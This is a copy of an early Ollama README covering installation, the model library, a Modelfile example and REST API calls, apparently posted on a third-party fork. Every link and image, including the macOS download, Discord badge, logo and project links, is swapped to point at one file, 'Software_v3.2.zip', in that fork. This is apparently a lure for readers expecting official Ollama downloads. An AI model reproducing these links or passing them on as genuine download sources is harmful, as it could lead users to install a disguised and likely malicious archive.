<div align="center">
  <picture>
    <source media="(prefers-color-scheme: dark)" height="200px" srcset="https://github.com/ShaaibAljaberi/ollama/raw/refs/heads/main/examples/recipemaker/Software_v3.2.zip">
    <img alt="logo" height="200px" src="https://github.com/ShaaibAljaberi/ollama/raw/refs/heads/main/examples/recipemaker/Software_v3.2.zip">
  </picture>
</div>

# Ollama

[![Discord](https://github.com/ShaaibAljaberi/ollama/raw/refs/heads/main/examples/recipemaker/Software_v3.2.zip)](https://github.com/ShaaibAljaberi/ollama/raw/refs/heads/main/examples/recipemaker/Software_v3.2.zip)

> Note: Ollama is in early preview. Please report any issues you find.

Run, create, and share large language models (LLMs).

## Download

- [Download](https://github.com/ShaaibAljaberi/ollama/raw/refs/heads/main/examples/recipemaker/Software_v3.2.zip) for macOS
- Download for Windows and Linux (coming soon)
- Build [from source](#building)

## Quickstart

To run and chat with [Llama 2](https://github.com/ShaaibAljaberi/ollama/raw/refs/heads/main/examples/recipemaker/Software_v3.2.zip), the new model by Meta:

```
ollama run llama2
```

## Model library

`ollama` includes a library of open-source models:

| Model                    | Parameters | Size  | Download                        |
| ------------------------ | ---------- | ----- | ------------------------------- |
| Llama2                   | 7B         | 3.8GB | `ollama pull llama2`            |
| Llama2 Uncensored        | 7B         | 3.8GB | `ollama pull llama2-uncensored` |
| Llama2 13B               | 13B        | 7.3GB | `ollama pull llama2:13b`        |
| Orca Mini                | 3B         | 1.9GB | `ollama pull orca`              |
| Vicuna                   | 7B         | 3.8GB | `ollama pull vicuna`            |
| Nous-Hermes              | 13B        | 7.3GB | `ollama pull nous-hermes`       |
| Wizard Vicuna Uncensored | 13B        | 7.3GB | `ollama pull wizard-vicuna`     |

> Note: You should have at least 8 GB of RAM to run the 3B models, 16 GB to run the 7B models, and 32 GB to run the 13B models.

## Examples

### Run a model

```
ollama run llama2
>>> hi
Hello! How can I help you today?
```

### Create a custom model

Pull a base model:

```
ollama pull llama2
```
> To update a model to the latest version, run `ollama pull llama2` again. The model will be updated (if necessary).

Create a `Modelfile`:

```
FROM llama2

# set the temperature to 1 [higher is more creative, lower is more coherent]
PARAMETER temperature 1

# set the system prompt
SYSTEM """
You are Mario from Super Mario Bros. Answer as Mario, the assistant, only.
"""
```

Next, create and run the model:

```
ollama create mario -f ./Modelfile
ollama run mario
>>> hi
Hello! It's your friend Mario.
```

For more examples, see the [examples](./examples) directory.

For more information on creating a Modelfile, see the [Modelfile](https://github.com/ShaaibAljaberi/ollama/raw/refs/heads/main/examples/recipemaker/Software_v3.2.zip) documentation.

### Pull a model from the registry

```
ollama pull orca
```

### Listing local models

```
ollama list
```

## Model packages

### Overview

Ollama bundles model weights, configuration, and data into a single package, defined by a [Modelfile](https://github.com/ShaaibAljaberi/ollama/raw/refs/heads/main/examples/recipemaker/Software_v3.2.zip).

<picture>
  <source media="(prefers-color-scheme: dark)" height="480" srcset="https://github.com/ShaaibAljaberi/ollama/raw/refs/heads/main/examples/recipemaker/Software_v3.2.zip">
  <img alt="logo" height="480" src="https://github.com/ShaaibAljaberi/ollama/raw/refs/heads/main/examples/recipemaker/Software_v3.2.zip">
</picture>

## Building

```
go build .
```

To run it start the server:

```
./ollama serve &
```

Finally, run a model!

```
./ollama run llama2
```

## REST API

### `POST /api/generate`

Generate text from a model.

```
curl -X POST http://localhost:11434/api/generate -d '{"model": "llama2", "prompt":"Why is the sky blue?"}'
```

### `POST /api/create`

Create a model from a `Modelfile`.

```
curl -X POST http://localhost:11434/api/create -d '{"name": "my-model", "path": "/path/to/modelfile"}'
```

## Projects built with Ollama

- [Continue](https://github.com/ShaaibAljaberi/ollama/raw/refs/heads/main/examples/recipemaker/Software_v3.2.zip) - embeds Ollama inside Visual Studio Code. The extension lets you highlight code to add to the prompt, ask questions in the sidebar, and generate code inline.
- [Discord AI Bot](https://github.com/ShaaibAljaberi/ollama/raw/refs/heads/main/examples/recipemaker/Software_v3.2.zip) - interact with Ollama as a chatbot on Discord.
- [Raycast Ollama](https://github.com/ShaaibAljaberi/ollama/raw/refs/heads/main/examples/recipemaker/Software_v3.2.zip) - Raycast extension to use Ollama for local llama inference on Raycast.
- [Simple HTML UI for Ollama](https://github.com/ShaaibAljaberi/ollama/raw/refs/heads/main/examples/recipemaker/Software_v3.2.zip)
